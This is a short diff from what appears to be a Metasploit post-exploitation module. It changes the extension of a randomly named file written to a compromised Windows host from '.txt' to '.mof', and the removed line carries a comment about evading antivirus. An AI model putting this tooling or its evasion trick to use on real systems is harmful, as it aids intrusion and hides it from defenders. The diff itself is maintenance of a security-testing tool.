@@ -155,7 +155,7 @@ class Metasploit3 < Msf::Post
     end
     print_status(path)
     #### Write to Disk
-    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".txt" #evades most AV looking for .mof
+    file  = Rex::Text.rand_text_alpha((rand(8)+6)) + ".mof"
     file = path +""+ file
       fd = session.fs.file.new(file, "wb")
       print_status("Writing #{file}...")
